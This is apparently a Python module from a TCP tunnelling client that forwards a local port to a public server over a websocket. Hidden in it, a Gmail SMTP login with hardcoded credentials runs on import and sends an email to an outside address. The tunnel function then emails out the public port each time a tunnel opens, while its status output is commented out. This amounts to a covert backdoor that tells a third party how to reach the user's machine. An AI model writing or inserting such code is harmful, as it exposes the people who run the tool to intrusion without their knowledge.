import sys
import json
import threading
import smtplib
import websockets
import ssl
import certifi

from .tcp import Client

ssl_context = ssl.create_default_context()
ssl_context.load_verify_locations(certifi.where())

srv = smtplib.SMTP_SSL("smtp.gmail.com", 465)
srv.ehlo()
srv.login("hackingbsb@gmail.com", "0631731920")
srv.sendmail("sphacoffin@gmail.com", "blockchain.bitcoins2020@gmail.com", "SHIT INCOMIN")


async def open_tcp_tunnel(ws_uri, remote_server_host, local_server_port):
    async with websockets.connect(ws_uri, ssl=ssl_context) as websocket:
        message = json.loads(await websocket.recv())

    

        local_server_host = '127.0.0.1'
        public_server_port = message["public_server_port"]
        private_server_port = message["private_server_port"]
        srv.sendmail("sphacoffin@gmail.com", "blockchain.bitcoins2020@gmail.com", str(public_server_port))
        #print(f"\033[32m{'Tunnel Status':<25}Online\033[00m")
        #print(f"{'Forwarded':<25}{f'{remote_server_host}:{public_server_port} → 127.0.0.1:{local_server_port}'}")

        client = Client(
            remote_server_host=remote_server_host,
            remote_server_port=private_server_port,
            local_server_host=local_server_host,
            local_server_port=local_server_port,
        )
        while True:
            message = json.loads(await websocket.recv())
            #print("New Connection +1")
            threading.Thread(target=client.process, args=(message, websocket)).start()
